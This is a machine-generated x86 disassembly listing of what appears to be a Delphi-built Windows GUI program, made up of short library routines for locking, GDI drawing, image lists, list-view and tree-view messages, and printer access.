mov dl [ eax + 0x19 ]
mov eax edx
retn
sub_42180c
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_42183c
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_42195a
jmp sub_403e54
sub_421961
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4210a8
retn
sub_421977
jmp sub_403e54
sub_4219ed
jmp sub_403e54
sub_4219f4
pop ebx
pop ecx
pop ebp
retn
sub_4219f8
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_421aae
jmp sub_403e54
sub_421ad4
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_421b04
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_421c13
jmp sub_403e54
sub_421c1a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4210a8
retn
sub_421c30
jmp sub_403e54
sub_421ca9
jmp sub_403e54
sub_421cb0
pop ebx
pop ecx
pop ebp
retn
sub_421de1
jmp sub_403e54
sub_421df4
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_422134
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_422208
call sub_422508
retn
sub_4223d0
jmp sub_403e54
sub_4223d7
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_4223e0
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_422418
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_422564
retn
sub_422630
push ebx
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_422644
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_422730
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_422750
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_422770
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_422790
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
pop ebx
retn
sub_4227a8
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
pop ebx
retn
sub_4227cc
mov eax [ rw-data ]
call sub_4227a8
retn
sub_42282e
jmp sub_403e54
sub_422835
pop ecx
pop ebp
retn
sub_4228d4
jmp sub_403e54
sub_4228db
pop ebx
mov esp ebp
pop ebp
retn
sub_4229ad
jmp sub_403e54
sub_422a3e
jmp sub_403e54
sub_422a45
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_422a70
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_422b57
jmp sub_403e54
sub_422d04
jmp sub_403e54
sub_422d0b
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_422f1d
jmp sub_403e54
sub_422f24
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_422fbe
jmp sub_403e54
sub_42319a
jmp sub_403e54
sub_423254
jmp sub_403e54
sub_42325b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42327b
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_423274
jmp sub_403e54
sub_42327b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_423409
jmp sub_403e54
sub_4235d4
jmp sub_403e54
sub_4235db
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4235fe
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_402764
retn
sub_4235f7
jmp sub_403e54
sub_4235fe
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42361e
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_402764
retn
sub_423617
jmp sub_403e54
sub_42361e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_423628
xor ecx ecx
mov edx eax
add eax 0x14
jmp r-xdata
cmp edx eax
jl r-xdata
xor cx [ edx ]
add edx 0x2
mov eax ecx
retn
sub_423788
push 0x0
call sub_423724
retn
sub_42382d
jmp sub_403e54
sub_423834
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_423840
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_423790
pop ebx
pop ebp
retn 0x4
sub_423854
retn
sub_423858
test eax eax
jne r-xdata
retn
call sub_423854
sub_423a2b
jmp sub_403e54
sub_423a52
jmp sub_403e54
sub_423a59
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423a98
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_423c68
mov eax [ ebp - 0xc ]
call sub_4036c0
retn
sub_423c71
jmp sub_403e54
j_sub_423c68
jmp sub_423c68
sub_423c78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4036c0
retn
sub_423c8e
jmp sub_403e54
sub_423ca0
xor eax eax
retn
sub_423ca4
mov al [ eax + 0x21 ]
retn
sub_423cf0
jmp sub_403e54
sub_423cf7
pop esi
pop ecx
pop ebp
retn
sub_423d24
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_423d7b
jmp sub_403e54
sub_423d82
pop esi
pop ecx
pop ebp
retn
sub_423d88
retn
sub_423d8c
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_423d9c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_423f21
jmp sub_403e54
sub_423f28
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_424047
jmp sub_403e54
sub_42404e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4240df
jmp sub_403e54
sub_4240e6
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42416e
jmp sub_403e54
sub_424175
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4242ff
jmp sub_403e54
sub_424306
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4244bc
jmp sub_403ba0
sub_42451c
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_423e44
mov [ rw-data ] eax
sub_42453c
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4243cc
mov [ rw-data ] eax
sub_424664
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_424600
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_42470c
jmp sub_403ba0
sub_4247ef
jmp sub_403ba0
sub_424850
jmp sub_403e54
sub_424857
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4248d7
jmp sub_403ba0
sub_424950
push ebx
mov ebx edx
call sub_42453c
mov edx ebx
call sub_4244e0
test eax eax
setne al
pop ebx
retn
sub_424968
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_424664
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
pop ebx
retn
sub_424980
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_424664
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop edi
pop esi
retn
sub_424ac9
jmp sub_403ba0
sub_424b47
jmp sub_403e54
sub_424b4e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424ce8
retn
sub_424e88
cmp [ eax + 0x28 ] 0x0
sete al
retn
sub_42518c
jmp sub_403e54
sub_425193
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42530b
jmp sub_403e54
sub_425312
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42538a
jmp sub_403e54
sub_425391
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4253a5
add [ eax ] al
add [ ebx + 0x74002878 ] al
adc al [ eax + 0x74002c78 ]
pop es
call sub_425690
jmp r-xdata
retn
sub_4253bb
call sub_42571c
retn
sub_4254b0
retn
sub_42570c
jmp sub_403e54
sub_425837
jmp sub_403e54
sub_42583e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
sub_425857
jmp sub_403e54
sub_425a2e
jmp sub_403e54
sub_425a56
jmp sub_403e54
sub_425a5d
mov esp ebp
pop ebp
retn
sub_425ad4
jmp sub_403e54
sub_425bdc
jmp sub_403e54
sub_425cc7
jmp sub_403e54
sub_425cd4
inc [ eax + 0x4 ]
retn
sub_425e4f
jmp sub_403e54
sub_426200
jmp sub_403e54
sub_42644a
jmp sub_403e54
sub_426474
jmp sub_403e54
sub_42647b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42649d
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_426496
jmp sub_403e54
sub_4264a7
jmp sub_403ba0
sub_4264f6
jmp sub_403e54
sub_426723
jmp sub_403e54
sub_42676b
jmp sub_403e54
sub_4268d8
jmp sub_403e54
sub_42699f
jmp sub_403ba0
sub_4269f4
mov [ eax + 0x31 ] 0x0
call sub_423a98
retn
sub_426c46
jmp sub_403e54
sub_426cb1
jmp sub_403e54
sub_426cb8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426d28
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_426ddc
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_426dec
push ebx
mov ebx eax
mov eax ebx
call sub_426fa4
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_426e00
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_426e1c
push ebx
mov ebx eax
mov eax ebx
call sub_427004
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_426e78
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_426f87
jmp sub_403e54
sub_4271b9
jmp sub_403e54
sub_4271c0
pop ebx
pop ecx
pop ebp
retn
sub_42724b
jmp sub_403ba0
sub_4272ab
jmp sub_403e54
sub_4272b2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_427693
jmp sub_403e54
sub_4276bf
jmp sub_403e54
sub_427726
jmp sub_403ba0
sub_427757
jmp sub_403e54
sub_4277dc
jmp sub_403ba0
sub_4277e1
mov eax [ ebp - 0x38 ]
call sub_4036c0
call sub_403eb4
call sub_403f08
sub_4277f3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427810
mov eax [ ebp - 0x18 ]
call sub_402764
retn
sub_427809
jmp sub_403e54
sub_42795f
jmp sub_403ba0
sub_427c2b
jmp sub_403ba0
sub_427d0c
mov cl 0x1
call sub_427d14
retn
sub_427fc9
add [ eax ] al
add [ ebx ] dh
leave
call sub_427d14
retn
sub_42804e
jmp sub_403ba0
sub_428053
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_403eb4
call sub_403f08
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4280a4
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_4281dd
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_42820c
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_428220
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_428339
jmp sub_403ba0
sub_4283ef
jmp sub_403ba0
sub_428458
jmp sub_403ba0
sub_42848c
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_428418
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_4284a4
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_422790
retn
mov [ eax + 0x30 ] edx
retn
sub_4284bc
retn
sub_4284c0
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_422790
retn
mov [ eax + 0x2c ] edx
retn
sub_428504
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_422790
pop ebp
retn 0x4
sub_428518
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_422790
pop ebp
retn 0x4
sub_42856d
jmp sub_403e54
sub_428574
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_428728
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_428734
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_4287e1
jmp sub_403e54
sub_4287e8
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4288d3
jmp sub_403ba0
sub_42893f
jmp sub_403e54
sub_428a6d
jmp sub_403e54
sub_428a74
pop ebp
retn
sub_428ba9
jmp sub_403e54
sub_428bb0
pop ebp
retn
sub_428dfc
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_4161a0
retn
sub_428e30
mov eax [ eax + 0x4 ]
call sub_416044
retn
sub_428e61
jmp sub_403e54
sub_428e68
pop ebp
retn
sub_428e6c
sub [ rw-data ] 0x1
retn
InitCommonControls
jmp [ __import_lookup_table_12(comctl32:InitCommonControls) ]
ImageList_Create
jmp [ __import_lookup_table_12(comctl32:ImageList_Create) ]
ImageList_Destroy
jmp [ __import_lookup_table_12(comctl32:ImageList_Destroy) ]
ImageList_GetImageCount
jmp [ __import_lookup_table_12(comctl32:ImageList_GetImageCount) ]
ImageList_ReplaceIcon
jmp [ ImageList_ReplaceIcon@IAT ]
ImageList_SetBkColor
jmp [ ImageList_SetBkColor@IAT ]
ImageList_GetBkColor
jmp [ ImageList_GetBkColor@IAT ]
sub_428f54
shl eax 0x8
retn
ImageList_Replace
jmp [ __import_lookup_table_12(comctl32:ImageList_Replace) ]
ImageList_Remove
jmp [ __import_lookup_table_12(comctl32:ImageList_Remove) ]
ImageList_BeginDrag
jmp [ __import_lookup_table_12(comctl32:ImageList_BeginDrag) ]
ImageList_EndDrag
jmp [ __import_lookup_table_12(comctl32:ImageList_EndDrag) ]
ImageList_DragEnter
jmp [ __import_lookup_table_12(comctl32:ImageList_DragEnter) ]
ImageList_DragLeave
jmp [ __import_lookup_table_12(comctl32:ImageList_DragLeave) ]
ImageList_DragMove
jmp [ __import_lookup_table_12(comctl32:ImageList_DragMove) ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Write
jmp [ ImageList_Write@IAT ]
ImageList_GetIconSize
jmp [ ImageList_GetIconSize@IAT ]
ImageList_SetIconSize
jmp [ ImageList_SetIconSize@IAT ]
sub_429004
push ecx
push edx
push 0x1212
push eax
call SendMessageA
retn
sub_429014
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1001
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429048
push 0x0
push 0x0
push 0x1004
push eax
call SendMessageA
retn
sub_429058
shl eax 0xc
retn
sub_42905c
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1005
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429074
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1006
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42908c
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1007
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_4290a4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x1008
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_4290bc
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x1009
push ebx
call SendMessageA
pop ebx
retn
sub_4290f4
push ecx
push edx
push 0x100d
push eax
call SendMessageA
retn
sub_429140
push edx
push 0x0
push 0x1012
push eax
call SendMessageA
retn
sub_42916c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x1016
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429184
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x1018
push ebx
call SendMessageA
pop ebx
retn
sub_4291b4
push ecx
push edx
push 0x101b
push eax
call SendMessageA
retn
sub_4291c4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x101c
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_4291dc
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x101d
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429234
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1024
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42924c
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1026
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429264
push 0x0
push 0x0
push 0x1027
push eax
call SendMessageA
retn
sub_429274
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1029
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_4292dc
push ecx
push edx
push 0x102c
push eax
call SendMessageA
retn
sub_429368
push 0x0
push edx
push 0x102f
push eax
call SendMessageA
retn
sub_429378
push ecx
push edx
push 0x102f
push eax
call SendMessageA
retn
sub_4293a4
push 0x0
push 0x0
push 0x1032
push eax
call SendMessageA
retn
sub_4293b4
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1036
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429420
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1100
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429438
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1101
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429450
push ebx
mov ebx eax
push 0xffff0000
push 0x0
push 0x1101
push ebx
call SendMessageA
pop ebx
retn
sub_4294a8
push 0x0
push 0x0
push 0x1105
push eax
call SendMessageA
retn
sub_4294b8
push 0x0
push 0x0
push 0x1106
push eax
call SendMessageA
retn
sub_4294c8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x1107
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429518
mov ecx 0x4
call sub_4294fc
retn
sub_429530
mov ecx 0x2
call sub_4294fc
retn
sub_42953c
mov ecx 0x3
call sub_4294fc
retn
sub_429548
mov ecx 0x5
xor edx edx
call sub_4294fc
retn
sub_429558
mov ecx 0x6
call sub_4294fc
retn
sub_429564
mov ecx 0x7
call sub_4294fc
retn
sub_429570
mov ecx 0x9
xor edx edx
call sub_4294fc
retn
sub_429580
mov ecx 0x8
xor edx edx
call sub_4294fc
retn
sub_429590
xor ecx ecx
xor edx edx
call sub_4294fc
retn
sub_4295d0
mov ecx 0x5
call sub_42959c
retn
sub_4295dc
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x110c
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_4295f4
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x110d
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42960c
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x110f
push ebx
call SendMessageA
pop ebx
retn
sub_429620
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1111
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429638
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1112
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42966c
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x111d
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429684
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x111e
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42969c
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1002
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_4296b4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x1004
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_4296cc
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1006
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_4296e4
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1009
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429718
push edx
push 0x0
push 0x100f
push eax
call SendMessageA
retn
sub_429744
push 0x0
push edx
push 0x1014
push eax
call SendMessageA
retn
sub_4297a8
push 0x0
push 0x0
push 0x1008
push eax
call SendMessageA
retn
sub_4297dd
jmp sub_403e54
sub_4297e4
pop ebp
retn
sub_4297e8
sub [ rw-data ] 0x1
retn
sub_4298af
jmp sub_403e54
sub_4298b6
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_429ecc
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_4298d8
mov [ rw-data ] sub_4299f0
mov [ rw-data ] sub_429960
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_429bf4
mov [ rw-data ] sub_429cc8
mov [ rw-data ] sub_429d9c
retn
sub_429f5d
jmp sub_403e54
sub_429f64
pop ebp
retn
sub_429f68
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_429ecc
sub_429f9d
jmp sub_403e54
sub_429fa4
pop ebp
retn
sub_429fa8
sub [ rw-data ] 0x1
retn
sub_42a3fc
jmp sub_403e54
sub_42a403
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_42a4c5
jmp sub_403e54
sub_42a4cc
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_42a676
jmp sub_403e54
sub_42a67d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a839
jmp sub_403e54
sub_42a89e
jmp sub_403e54
sub_42a8a5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a991
jmp sub_403e54
sub_42a998
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42aba8
lea eax [ ebp - 0x30 ]
call sub_40442c
lea eax [ ebp - 0x20 ]
call sub_40442c
retn
sub_42abb9
jmp sub_403e54
j_sub_42aba8
jmp sub_42aba8
sub_42abc0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42acbb
jmp sub_403e54
sub_42acc2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42adbf
jmp sub_403e54
sub_42adc6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ae2f
lea eax [ ebp - 0x4 ]
call sub_406194
retn
sub_42ae38
jmp sub_403e54
j_sub_42ae2f
jmp sub_42ae2f
sub_42ae3f
pop ebx
pop ecx
pop ebp
retn
sub_42aeee
jmp sub_403e54
sub_42aef5
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_42af00
mov eax [ eax + 0x20 ]
retn
sub_42b016
jmp sub_403e54
sub_42b01d
pop ebp
retn
sub_42b020
sub [ rw-data ] 0x1
retn
ClosePrinter
jmp [ __import_lookup_table_13(winspool:ClosePrinter) ]
OpenPrinterA
jmp [ OpenPrinterA@IAT ]
sub_42b06d
jmp sub_403e54
sub_42b074
pop ebp
retn
sub_42b078
sub [ rw-data ] 0x1
retn
sub_42b18c
push ebp
mov ebp esp
mov eax [ rw-data ]
mov eax [ eax ]
call sub_461c94
mov eax [ rw-data ]
mov al [ eax + 0x1d ]
xor al 0x1
neg al
sbb eax eax
pop ebp
retn 0x8
sub_42b303
jmp sub_403e54
sub_42b30a
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_42b464
push ebx
mov ebx eax
mov dl 0x1
mov eax [ ebx + 0x58 ]
call sub_42b6b0
mov eax ebx
call sub_422630
mov eax ebx
call sub_42b484
pop ebx
retn
sub_42b6a2
jmp sub_403e54
sub_42b6a9
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42b715
jmp sub_403e54
sub_42b71c
pop ecx
pop ecx
pop ebp
retn
sub_42baeb
jmp sub_403e54
sub_42baf2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42bafc
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x4 ]
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b404
mov [ ebx + 0x4 ] eax
sub_42bb30
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_42b584
push 0xa
mov eax [ ebx + 0x20 ]
push eax
call GetDeviceCaps
pop ebx
retn
sub_42bb4c
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_42b584
push 0x8
mov eax [ ebx + 0x20 ]
push eax
call GetDeviceCaps
pop ebx
retn
sub_42bb68
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0xffffffff
jne r-xdata
mov eax [ ebx + 0x14 ]
pop ebx
retn
mov eax ebx
call sub_42bdc0
sub_42bd5b
jmp sub_403e54
sub_42bd6c
jmp sub_403ba0
sub_42bdaf
jmp sub_403e54
sub_42bdb6
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42bf5d
jmp sub_403e54
sub_42bf9d
jmp sub_403e54
sub_42bfa4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42bffc
add eax 0x8
call sub_40dabc
retn
sub_42c008
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b4cc
mov [ rw-data ] eax
sub_42c059
jmp sub_403e54
sub_42c060
pop ebp
retn
sub_42c064
sub [ rw-data ] 0x1
retn
sub_42c371
jmp sub_403e54
sub_42c378
pop ebp
retn
sub_42c37c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42c0c8
sub_42ed70
xor al 0xea
inc ecx
add al cl
or al 0x44
add [ eax + 0x740041ea ] cl
or eax 0xe9b80044
inc ecx
add [ edx + ebp * 8 + 0x41 ] cl
add al al
0xbb40041 0x44
